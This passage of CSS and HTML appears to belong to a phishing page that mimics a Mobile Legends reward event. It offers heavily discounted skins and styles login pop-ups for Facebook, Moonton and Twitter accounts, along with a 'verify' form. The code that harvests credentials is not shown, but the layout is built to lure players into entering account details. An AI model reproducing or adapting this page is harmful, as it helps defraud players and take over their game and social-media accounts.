	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	display: block;
}

.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: left;
}

.popup-box-formx label {
	width: 70%;
	text-align: left;
	padding-left: 20px;
	color: #B7B7B7;
	text-shadow: none;
	font-size: 17px;
}

.popup-box-formx input {
	background: #001;
	width: 85%;
	height: 35px;
	margin-bottom: 8px;
	margin-left: 20px;
	padding-right: 4px;
	padding: 4px;
	color: #fff;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	border: 0.1px solid #fff;
	outline: none;
	position: left;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-formx input::placeholder {
	color: #BCCBCE;
}


.popup-box-formx-footer {
	background-size: 100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}

.loadinglogin {
	width: 100%;
	height: auto;
}

.loadinglogin video {
	width: 400px;
	height: auto;
}

.box {
	width: 100%;
	height: 410px;
	margin-left: auto;
	margin-right: auto;
	margin-top: -30px;
	margin-bottom: -25px;
	border: 0px solid #FFFAC9;
	border-radius: 5px;
	position: relative;
	display: block;
}

.box-item {
	width: 100%;
	margin-left: auto;
	margin-right: auto;
	padding-top: 2px;
}


.btn-wrapper {
	width: 93%;
	height: 50px;
	margin-top: 3px;
	margin-right: 3px;
	font-family: laza;
}

.btn-wrapper button {
	background: url(https://images.cahyosr.my.id/img/13/tombol.png) no-repeat center;
	background-size: 100% 100%;
	width: 38%;
	height: 40px;
	margin: -10px;
	padding: 10px;
	color: #FFFAC9;
	font-family: laza;
	font-size: 18px;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
	float: right;
	display: inline-block;
}

.mobapay-footer {
    padding-top: 56px
    margin-top: auto;
    z-index: 1
	position: relative;
}

.mobapay-footer-inner {
    background: #191c25;
    padding-bottom: 28px;
}

.mobapay-footer-inner.padding-bottom {
    padding-bottom: 2px
}

.mobapay-footer-social {
    padding: 18px;
    border-bottom: 1.2px solid var(--color-primary-bg);
    width: 361px;
    margin-left: 13px;
}

.mobapay-footer-social-tip {
    font-size: 12px;
    padding: 14px;
    color: var(--color-text);
    margin-left: -30px;
}

.mobapay-footer-social-grouping {
    display: flex;
    margin-top: -1px;
    margin-left: -13px;
    cursor: pointer
}

.mobapay-footer-social-grouping-item {
    margin-right: 5px;
}

.mobapay-footer-social-grouping-item:last-child {
    margin-right: 0
}

.mobapay-footer-social-grouping-item img {
    width: 72px;
    height: 39px;
    vertical-align: top;
    margin-left: -21px;
}

.mobapay-footer-share {
    display: flex;
    align-items: center;
    color: var(--color-text)
}

.mobapay-footer-share-iconbox {
    background: url(../https://images.cahyosr.my.id/img/13/share.jpg);
    background-size: 100% 100%;
    width: 47px;
    height: 45px;
    margin-top: 4px;
    margin-bottom: 25px;
    font-size: 22px;
    margin-left: 8px;
    margin-right: 11px;
    border-radius: 7px;
    cursor: pointer;
}

.mobapay-footer-share-iconname {
	cursor: pointer;
    font-size: 14px;
    margin-top: -21px;
    margin-left: -6px;
}

.mobapay-footer-share-icon {
    width: 32px;
    height: 35px;
}

.mobapay-footer-share-popup {
    background: #000;
    height: 2px;
}

.mobapay-footer-terms {
    display: flex;
    padding-top: 0px;
    padding-left: 16px;
    margin-top: 21px;
}

.mobapay-footer-terms li {
    display: flex;
    align-items: center;
    position: relative;
    font-size: 10px;
    padding: 0px 10px;
    color: var(--color-text-secondary);
    cursor: pointer
}

.mobapay-footer-terms li:after {
    position: absolute;
    content: "";
    right: 0;
    height: 100%;
    width: 1px;
    background: var(--color-text-secondary)
}

.mobapay-footer-terms li:first-child {
    padding-left: 0;
}

.mobapay-footer-terms li:last-child {
    padding-right: 0
}

.mobapay-footer-terms li:last-child:after {
    display: none
}

.mobapay-footer-copyright {
    font-size: 10px;
    color: var(--color-text-secondary);
    margin-top: -8px;
    padding-left: 16px;
}


.verify-box-navbar {
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}

.verify-box-navbar-form {
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: 25px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.verify-box-navbar-form input {
	background: url(https://images.cahyosr.my.id/img/13/verify-bg.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #f1f1f0;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	border: 2px solid #232323;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	border-radius: 15px;
}

.verify-box-navbar-form input::placeholder {
	color: #f1f1f0;
}

.verify-box-navbar-form select {
	background: url(https://images.cahyosr.my.id/img/13/verify-bg.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #f1f1f0;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	border: 2px solid #232323;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	border-radius: 15px;
}

.verify-box-content {
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}

.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #f1f1f0;
	margin-top: 29px;
	font-size: 100px;
	text-align: center;
}

.verify-box-content button {
	background: url(https://images.cahyosr.my.id/img/13/submit.png) no-repeat center center;
	background-size: 76% 77%;
	width: 55%;
	height: 55px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 9px;
	padding-top: 8px;
	padding-left: 20px;
	padding-right: 20px;
	color: #030303;
	font-size: 19px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border: none;
	display: block;
}

.about-box-content {
	background: url(https://images.cahyosr.my.id/img/13/aboutrules-sec.png) no-repeat center center;
	background-size: 100% 100%;
	width: 96%;
	height: 120px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 20px;
	padding-left: auto;
	padding-right: auto;
	float: center;
	color: #000;
	display: block;
}

.about-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.about-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 100px;
	text-align: center;
}


figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}

.itemShine figure {
	position: relative;
}

.itemShine figure::before {
    background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
    width: 41%;
    height: 100%;
    top: 0px;
    left: -75%;
    position: absolute;
    z-index: 2;
    content: '';
    display: block;
    -webkit-transform: skewX(-25deg);
    transform: skewX(-25deg);
}

.itemShine figure::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}

@-webkit-keyframes shine {
	100% {
		left: 125%;
	}
}

@keyframes shine {
	100% {
		left: 125%;
	}
}

.kanan {
	float: right;
}

.kiri {
	float: left;
}

.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}

::-webkit-scrollbar {
	display: none;
	width: 0px;
}

.twitter-load {
	background-size: 100% 100%;
	width: 93%;
	height: 388px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}

.twitter-load-title {
	width: 95%;
	height: auto;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	padding-top: 90px;
	color: #fff;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.twitter-load-title i {
	margin-top: 90px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #00acee;
	font-size: 50px;
	text-align: center;
}

.moonton-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 421px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.moonton-load-title {
	width: 95%;
	height: auto;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	padding-top: 90px;
	color: #fff;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.moonton-load-title i {
	margin-top: 90px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #00acee;
	font-size: 50px;	
	text-align: center;
}

.fb-load {
	background-size: 100% 100%;
	width: 93%;
	height: 304px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}

.fb-load img {
	width: 50px;
	height: 50px;
	margin-top: 215px;
	margin-bottom: -55px;
}

.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999998;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.fb-load-title i {
	margin-top: 200px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999998;
	font-size: 30px;
	text-align: center;
}

.event-notification {
	width: 93%;
	height: 53px;
	padding: 7px;
	margin-right: auto;
	margin-left: auto;
}

.event-notification-txt {
	padding-top: 10px;
	padding-left: 34px;
	color: #dbff85;
	font-size: 16px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	float: left;
}

.scroll {
  overflow: scroll;
  position: relative;
  width: 100%;
  height: 430px;
  margin-top: 0px;
  margin-left: auto;
  margin-right: auto;
  display: block;
  scrollbar-face-color: #ffbb40;
  scrollbar-shadow-color: #ffbb40;
  scrollbar-highlight-color: #ffbb40;
  scrollbar-3dlight-color: #ffbb40;
  scrollbar-darkshadow-color: #ffbb40;
  scrollbar-track-color: #ffbb40;
  scrollbar-arrow-color: #ffbb40;
}

.timer {
	background: url(https://images.cahyosr.my.id/img/13/bg_tip2.png) no-repeat center center;
    background-size: 89% 108%;
    width: 100%;
    height: 13%;
	margin-left: -5px;
	margin-top: 397px;
    display: block;
    padding-top: 25px;
    padding-left: 45px;
    text-align: center;
    font-size: 13px;
    font-family: laza4;
    font-weight: 500;
    color: #000000;
    font-style: oblique;
    text-shadow: 1px 1px 1px #f1f1f1;
    position: absolute;
}

.alter-text {
    display: block;
    margin-left: 14px;
    margin-right: 0;
    margin-top: -31px;
    margin-bottom: 32px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 92%;
}
.alter-text>span {
    display: inline-block;
    position: relative;
    color: #ffffff;
    cursor: default;
    font-size: 11px;
	text-shadow: none;
}
.alter-text>span:before,
.alter-text>span:after {
	background: #9093A6;
    border-bottom: 1px solid #9093A6;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 43px;
}
.alter-text>span:before {
    margin-right: 15px;
    right: 100%;
}
.alter-text>span:after {
    left: 100%;
    margin-left: 15px;
}

.notifgift {
	background: url(https://images.cahyosr.my.id/img/13/bg_tip3.png) no-repeat center center;
    position: absolute;
    opacity: 100%;
    color: #ffffff;
    text-shadow: 1px 1px 1px #000000;
    border-radius: 2px;
    background-size: 77% 100%;
    width: 88%;
    height: 34px;
    margin-top: -56px;
    padding-top: 9px;
    padding-right: 0px;
    text-align: center;
    font-size: 10px;
    font-family: laza;
    font-weight: 500;
    display: block;
}

.box-rewards {
	background-size: 105% 100%;
	width: 100%;
	height: auto margin-left:auto;
	margin-top: 0px;
	margin-right: auto;
	margin-bottom: 10px;
	border: 0px solid #E29E53;
	border-radius: 5px;
	position: relative;
	display: block;
}

.box-item-rewards {
	width: 100%;
	height: auto;
	padding-top: 20px;
	margin-right: auto;
}

.itemz {
	background: linear-gradient(45deg, #743f9b, #bdbdbd);
    background-size: 100% 100%;
    border: 2px solid #acacac;
    border-top-left-radius: 7px;
    border-top-right-radius: 7px;
    width: 26%;
    height: 26%;
    margin: 3px;
    margin-bottom: 34px;
    display: inline-block;
	box-shadow: 0px 0px 4px #000;
}

.item {
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    width: 26%;
    height: 143px;
    margin: 4px;
    margin-bottom: 35px;
    display: inline-block;
    border: 4px #5b1010c9 double;
    border-radius: 4px;
    box-shadow: 1px 1px 3px 1px #4f050f;
}

.item2 {
	background: linear-gradient(45deg, #743f9b, #bdbdbd);
    background-size: 100% 100%;
    border: 2px solid #acacac;
    border-top-left-radius: 13px;
    border-top-right-radius: 13px;
    width: 26%;
    height: 26%;
    margin: 3px;
    margin-bottom: 34px;
    display: inline-block;
}

.item3 {
	background: linear-gradient(45deg, #743f9b, #bdbdbd);
    background-size: 100% 100%;
    border: 2px solid #acacac;
    border-top-left-radius: 13px;
    border-top-right-radius: 13px;
    width: 26%;
    height: 26%;
    margin: 3px;
    margin-bottom: 34px;
    display: inline-block;
}

.item .item-nominal {
	padding-right: 4px;
	color: #fff;
	font-size: 25px;
	font-family: DINMITTELSCHRIFTSTD;
	text-align: right;
	position: absolute;
}

.item-label .marquee {
    white-space: nowrap;
    font-family: laza;
    overflow: hidden;
    display: inline-block;
    animation: marquee 10s linear infinite;
}

.item-label .marquee a {
    display: inline-block;
}

@keyframes marquee {
    0% {
        transform: translate3d(0, 0, 0);
    }

    100% {
        transform: translate3d(-50%, 0, 0);
    }
}

.item img {
    width: 100%;
    height: 100%;
    margin-top: 0%;
    margin-bottom: 0;
}

.item-label {
	width: 100%;
    overflow: hidden;
    color: #ffffff;
    text-shadow: 1px 1px 1px #000000;
    font-size: 10px;
    font-family: laza;
    font-weight: 550;
    text-align: center;
    margin-top: -13px;
    margin-bottom: 3px;
}

.item-hot {
	background: #FFC107;
    width: 34px;
    color: #ffffff;
    text-shadow: 1px 1px 1px #000000;
    font-size: 9px;
    font-family: sans-serif;
    font-weight: 500;
    text-align: center;
    margin-top: -65px;
    margin-left: 3px;
    padding: 1px;
    border-top-right-radius: 7px;
    border-bottom-left-radius: 7px;
    position: absolute;
}

.item-pcs {
	color: #ffffff;
    text-shadow: 1px 1px 1px #000000;
    font-size: 14px;
    font-family: 'laza';
    font-weight: 550;
    text-align: center;
    margin-top: -19px;
    margin-left: 25px;
    position: absolute;
}

.item p {
    background: url(https://images.cahyosr.my.id/img/13/collect.png);
    background-size: 100% 100%;
    width: 110%;
    margin-left: -4px;
    height: 24px;
    padding: 3px;
    padding-top: 5px;
    padding-left: 18px;
    color: #fff;
    text-shadow: 1px 1px 1px #000000;
    font-size: 13px;
    font-family: arial;
    font-weight: 500;
    text-align: center;
    margin-top: 12px;
}

.item pz {
    background: url(https://images.cahyosr.my.id/img/13/button.png);
    background-size: 100% 100%;
    width: 104%;
    margin-left: -2px;
    height: 27px;
    padding: 3px;
    padding-top: 7px;
    padding-left: 18px;
    border: 1px solid #acacac;
    color: #000;
    text-shadow: 1px 1px 1px #ffffff;
    font-size: 13px;
    font-family: 'laza';
    font-weight: 500;
    text-align: center;
    margin-top: 2%;
    border-bottom-right-radius: 7px;
    border-bottom-left-radius: 7px;
	box-shadow: 0px 0px 4px #000;
}

.item p img {
    margin-left: -21px;
    margin-bottom: -6px;
    width: 15px;
    height: auto;
    border: none;
    position: absolute;
    margin-top: -1.5px;
}

.item s {
	text-decoration: line-through;
	color: #adadad;
}

.LabelCards_card_label_box__Hcfaa {
	box-sizing: border-box;
	left: 6px;
	overflow: hidden;
	position: absolute;
	right: 6px;
	top: 6px;
	z-index: 1;
}

.lazabox {
	background: url(https://images.cahyosr.my.id/img/13/lazabox.png);
	background-size: 100% 100%;
	width: 100%;
	height: 70%;
	margin-top: -230px;
	object-position: center;
}

.pd-giftbox {
	position: absolute;
	top: 41.8%;
	left: 64%;
	transform: translateX(-0.645rem);
}

.rtl .pd-giftbox {
	direction: ltr
}

.pd-giftbox>img:nth-child(1) {
	position: absolute;
	top: -43px;
	left: 25px;
	z-index: 2;
	width: 6.2rem;
	height: 4.92rem;
	transform: rotate(-18deg);
	transform-origin: 100% 100%;
	-moz-transform-origin: 100% 100%;
	-webkit-transform-origin: 100% 100%;
	-o-transform-origin: 100% 100%;
	animation: gift-box-hat-kf 5s infinite;
	-moz-animation: gift-box-hat-kf 5s infinite;
	-webkit-animation: gift-box-hat-kf 3s infinite;
	-o-animation: gift-box-hat-kf 3s infinite
}

.pd-giftbox>img:nth-child(2) {
	position: absolute;
	width: 7.29rem;
	height: 5.1rem;
}

@keyframes gift-box-hat-kf {
	0% {
		transform: rotate(0deg)
	}

	12.5% {
		transform: rotate(0deg)
	}

	25% {
		transform: rotate(-18deg)
	}

	37.5% {
		transform: rotate(-18deg)
	}

	50% {
		transform: rotate(0deg)
	}

	62.5% {
		transform: rotate(0deg)
	}

	75% {
		transform: rotate(-18deg)
	}

	87.5% {
		transform: rotate(-18deg)
	}

	100% {
		transform: rotate(0deg)
	}
}

.yun {
	position: absolute
}

.yun1_1 {
	width: 35px;
	height: 18px;
	left: 10px;
	top: 63px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun1_1.png) 0/100% 100% no-repeat
}

.yun1_2 {
	width: 19px;
	height: 12px;
	left: 10px;
	top: 130px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun1_2.png) 0/100% 100% no-repeat
}

.yun1_3 {
	width: 57px;
	height: 20px;
	left: 215px;
	top: 72px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun1_3.png) 0/100% 100% no-repeat
}

.yun2_1 {
	width: calc(136 / 1920 * 100vw);
	height: calc(61 / 1920 * 100vw);
	left: calc(93 / 1920 * 100vw);
	top: calc(141 / 1920 * 100vw);
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_1.png) 0/100% 100% no-repeat
}

.yun2_2 {
	width: calc(561 / 1920 * 100vw);
	height: calc(207 / 1920 * 100vw);
	left: calc(99 / 1920 * 100vw);
	top: calc(207 / 1920 * 100vw);
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_2.png) 0/100% 100% no-repeat
}

.yun2_3 {
	width: 68px;
	height: 25px;
	left: 293px;
	top: 19px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_3.png) 0/100% 100% no-repeat
}

.yun2_4 {
	width: 71px;
	height: 29px;
	left: 290px;
	top: 141px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_4.png) 0/100% 100% no-repeat;
}

.yun2_5 {
	width: 69px;
	height: 27px;
	left: 10px;
	top: 158px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_5.png) 0/100% 100% no-repeat
}

.yun2_6 {
	width: 58px;
	height: 28px;
	left: 263px;
	top: 88px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_6.png) 0/100% 100% no-repeat
}

.tab_rewards {
	background: url(https://images.cahyosr.my.id/img/13/box.png);
    background-size: 100% 100%;
    width: 104%;
    height: 361px;
    margin-top: 90px;
    margin-right: -8px;
    margin-left: 10px;
    padding-top: 52px;
    align-content: center;
    float: inline-end;
    opacity: 120%;
}

.nom {
	position: absolute;
	padding-left: 387px;
	padding-top: 51px;
	color: #fff;
	font-size: 13px;
	font-family: dinm;
	font-weight: 550;
}
.lazaslide p {
	background: repeating-linear-gradient(168deg, #ffffff, transparent 100px);
	background-size: 100% 100%;
	width: 312px !important;
	margin-top: 55%;
	padding-left: 5px;
	padding-right: 5px;
	padding: 3px;
	margin-left: 39px;
	float: left;
	text-align: center;
	border-top-left-radius: 7px;
	border-top-right-radius: 7px;
	border-bottom-left-radius: 7px;
	border-bottom-right-radius: 7px;
}
.lazaslide span {
	font-family: 'laza4';
	font-size: 12px;
	color: #000;
	text-shadow: 1px 1px 1px #ffffff;
}
.s3_tit {
	font-family: laza;
	color: #fff;
	margin-left: 5px;
	margin-top: 5px;
}


@media only screen and (max-width:600px) {
	.lazabox {
		background: url(https://images.cahyosr.my.id/img/13/lazabox.png);
		background-size: 100% 100%;
		width: 100%;
		height: 70%;
		margin-top: -230px;
		object-position: center;
	}

	.box-rewards {
		margin-top: 0px;
		width: 100%;
		height: auto;
	}

	.box-item-rewards {
		width: 100%;
		height: auto;
		padding-top: 20px;
		margin-left: auto;
		margin-right: auto;
	}

	.containerLanding,
	.containerHome {
		width: 100%;
		height: auto;
		margin-top: -3px;
		margin-bottom: 0px;
		border: none;
		border-radius: 0px;
		padding: 0px;
	}

	.slider-container {
		margin-top: -3px;
		border: none;
	}

	.laz-container {
		background: url(https://images.cahyosr.my.id/img/13/lazback.jpg) no-repeat center;
		background-size: 100% 100%;
		margin-top: -150px;
		padding: 5px;
		width: 100%;
		margin-left: 0px;
		margin-right: 0px;
		height: 480px;
		position: relative;
		background-color: #0000009c;
	}

	.gallery-container {
		float: left;
		margin-top: -2px;
		width: 100%;
		height: auto;
		border: 0px solid #fff;
	}

	.box {
		width: 100%;
		height: 405px;
		margin-top: -45px;
		margin-bottom: -25px;
	}

	.box-item {
		width: 100%;
		margin-left: auto;
		margin-right: auto;
		padding-top: 1px;
	}

	.loginpop {
		background: url(https://images.cahyosr.my.id/img/13/lazlogin.png) no-repeat center center;
		background-size: 100% 100%;
		width: 400px;
		height: 200px;
	}

	.lazaslide p {
        margin-top: 55%;
        margin-left: 39px;
	}


	.s3_tit {
	margin-left: 5px;
	margin-top: 5px;
	}

	.event-title {
        margin-top: -6px;
        margin-left: -5px;
	}

	.event-title2 {
        margin-top: 470px;
        margin-left: -5px;
	}

	.event-notification {
		width: 93%;
		height: 53px;
		padding: 7px;
		margin-right: auto;
		margin-left: auto;
	}

	.event-notification-text {
		padding-top: 11px;
		font-family: laza;
		font-size: 16px;
	}

	.footer {
		border-left: none;
		border-right: none;
		border-top: none;
		border-bottom: none;
	}

	.popup-box-wrapper {
		width: auto;
		margin-top: 60%;
	}

	.popup-box-wrapperz {
		width: 360px;
		margin-top: 60%;
	}

	.popup-box-wrappers {
		width: 360px;
		margin-top: 60%;
	}

	.popup-box-item {
		width: 16%;
    	height: 67px;
    	margin-top: 38px;
	}

	.popup-box-login-fb {
		margin-top: 35%;
	}

	.popup-box-login-moonton {
        margin-top: 46%;
   }

	.popup-box-login-twitter {
		margin-top: 40%;
	}

	.link-box {
		margin-top: 40%;
	}

	.footer {
		background-position-y: calc(500 / 640 * 210vw);
	}

	.footer-socmed-box p {
		margin-top: 12px;
	}

	.event-notification {

		background-size: auto;
		background-size: 94% 100%;
		width: 85%;
		height: 48px;
		margin-left: auto;
		margin-right: auto;
		margin-top: -2px;
		margin-bottom: -82px;
		display: block;
	}

	.event-notification-txt {
		padding-top: 10px;
		padding-left: 34px;
		color: #dbff85;
		font-size: 16px;
		font-family: Teko;
		font-weight: 550;
		text-align: left;
		float: left;
	}

	.timer {
        margin-left: -5px;
        margin-top: 397px;

	}
	.popup-box-item rw {
		top: 18px;
        right: -201px;
	}
	.popup-box-item pr {
		top: 41px;
    	right: -239px;
	}

	.popup-box-item prs {
    	right: -243px;
	}

	.notifgift {
		margin-top: -56px;
	}

	.event-notification-timer {
		padding-top: 44px;
		padding-right: 28px;
		color: #dbff85;
		font-size: 27px;
		font-family: Teko;
		font-weight: 550;
		text-align: left;
		margin-bottom: 13px;
		float: right;
	}

	.alert-text {
		margin-top: -330px;
		margin-left: -6px;
		padding: 7px;
		color: #ffffff;
		text-align: center;
		font-size: 14px;
		font-family: laza;
		border: none;
	}

	.alert-text-mid {
		margin-top: 1px;
		padding: 7px;
		color: #f1f1f0;
		text-align: center;
		font: 25px;
		font-family: laza;
		border: none;
		margin-right: -2px;
		font-size: 19px;
	}

	.popup-box-bg {
		background: url(https://images.cahyosr.my.id/img/13/popup-box-bg2.png) no-repeat center center;
		background-size: 100% 100%;
		width: 109%;
    	margin-top: -12px;
    	margin-left: -15px;
	}

	.s1_man1 {
		display: block;
		width: calc();
		height: calc();
		background: url(https://images.cahyosr.my.id/img/13/m416.png) center/100% 100% no-repeat;
		position: absolute;
		top: 400px;
		left: calc(-80 /1920*100vw);
		bottom: calc(-23 /1920*100vw);
		animation: bounce_down 4s linear infinite;
		-webkit-animation: bounce_down 4s linear infinite
	}

	@-webkit-keyframes bounce_down {
		25% {
			-webkit-transform: translateY(-10px)
		}

		50%,
		100% {
			-webkit-transform: translateY(0)
		}

		75% {
			-webkit-transform: translateY(10px)
		}
	}

	@keyframes bounce_down {
		25% {
			transform: translateY(-10px)
		}

		50%,
		100% {
			transform: translateY(0)
		}

		75% {
			transform: translateY(10px)
		}
	}
}

.i {

	display: inline-flex;
	width: 8%;
	animation: anim 8.5s ease-in-out infinite;
	transform: translateY(-150%) rotate(0deg);

}

.n1 {
	animation-delay: 0.1s;
}

.n2 {
	animation-delay: 1.2s;
}

.n3 {
	animation-delay: 0.6s;
	margin-left: 280px;
}

.n4 {
	animation-delay: 1.4s;
	width: 10px;
}

.n5 {
	animation-delay: 0.4s;
	width: 10px;
	margin-left: 160px;
}

.n6 {
	animation-delay: 0.6s;
}

h1 {
	transform: rotate(-45deg);
}

@keyframes anim {
	0% {
		transform: translateY(-180%) rotate(0deg);
	}

	100% {
		transform: translateY(120vh) rotate(-360deg);
	}
}

.yun {
	position: absolute
}

.yun1_1 {
	width: 35px;
	height: 18px;
	left: 10px;
	top: 63px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun1_1.png) 0/100% 100% no-repeat
}

.yun1_2 {
	width: 19px;
	height: 12px;
	left: 10px;
	top: 130px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun1_2.png) 0/100% 100% no-repeat
}

.yun1_3 {
	width: 57px;
	height: 20px;
	left: 215px;
	top: 72px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun1_3.png) 0/100% 100% no-repeat
}

.yun2_1 {
	width: calc(136 / 1920 * 100vw);
	height: calc(61 / 1920 * 100vw);
	left: calc(93 / 1920 * 100vw);
	top: calc(141 / 1920 * 100vw);
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_1.png) 0/100% 100% no-repeat
}

.yun2_2 {
	width: calc(561 / 1920 * 100vw);
	height: calc(207 / 1920 * 100vw);
	left: calc(99 / 1920 * 100vw);
	top: calc(207 / 1920 * 100vw);
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_2.png) 0/100% 100% no-repeat
}

.yun2_3 {
	width: 68px;
	height: 25px;
	left: 293px;
	top: 19px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_3.png) 0/100% 100% no-repeat
}

.yun2_4 {
	width: 71px;
	height: 29px;
	left: 290px;
	top: 141px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_4.png) 0/100% 100% no-repeat;
}

.yun2_5 {
	width: 69px;
	height: 27px;
	left: 10px;
	top: 158px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_5.png) 0/100% 100% no-repeat
}

.yun2_6 {
	width: 58px;
	height: 28px;
	left: 263px;
	top: 88px;
	background: url(https://images.cahyosr.my.id/img/13/lazcloud/yun2_6.png) 0/100% 100% no-repeat
}

.pengkhianat-setengah {
    width: 48.3%;
	margin:0px; 
    display: inline-block;
}
</style>

<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="https://images.cahyosr.my.id/img/13/style-img/logo.png">
<img class="navbar-language" src="https://images.cahyosr.my.id/img/13/style-img/glob.png">
<img class="navbar-menu" src="https://akmweb.youngjoygame.com/web/gms/image/52f454a74eaa950324d001ffca0ed6c5.png"></div>
</div> <!--- navbar-right --->
</div>
</div> <!--- navbar-right --->
</div> <!--- Banner/Video --->
<div class="header">
<img src="https://images.cahyosr.my.id/img/13/image/64b9f5e21af4ba6b651c647b9f0a0d30.jpg" class="width: 100%;"></img></div>
<div class="laz-home">
<div class="laz-container" style="margin-top:-1px;">
<div>
<div> 
<div class="event-title" style="opacity: 100%;"></div>
<div class="event-title2" style="opacity: 100%;"></div>


<div class="box-rewards">
<div class="box-item-rewards">
<div class="scroll">
<center>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/1821011e7fefea2daba09345ee0cd4da.jpg" item-name="Lukas  - Naruto Uzumaki" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/1821011e7fefea2daba09345ee0cd4da.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/6200e7a5b194bfb191cb812c3f27604b.jpg" item-name="Suyou  - Sasuke Uchiha" item-total="" item-price="1">
<div>
<figure>
